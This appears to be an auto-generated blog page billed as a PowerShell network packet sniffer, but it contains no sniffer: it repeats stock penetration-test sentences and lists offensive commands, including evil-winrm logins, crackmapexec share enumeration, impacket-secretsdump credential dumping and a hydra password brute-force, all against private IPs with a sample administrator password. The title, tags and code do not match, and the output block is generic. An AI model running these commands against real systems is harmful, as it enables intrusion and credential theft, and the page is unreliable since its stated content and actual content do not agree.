---
TitleSEO: "Network Packet Sniffer in PowerShell | ZureFX"
TitlePost: "Network Packet Sniffer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for network packet sniffer. Built for security research and automation."
Keywords: "automation, python, script, powershell"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-777.html"
URL_IMAGES: ""
Date: "2025-05-27"
Tags: "Automation, Python, Script, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-777"
Permalink: "/scripting/script-network-packet-sniffer-777.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `nmap`
- `msfvenom`
- `wmiexec`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

```powershell
evil-winrm -i 10.44.95.115 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.72.102.148/FUZZ
crackmapexec smb 10.115.188.22 -u administrator -p 'P@ssw0rd!' --shares
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
gobuster dir -u http://10.27.100.204/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.109.133.27 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.39.20.215
evil-winrm -i 10.89.103.4 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 1.75s
```
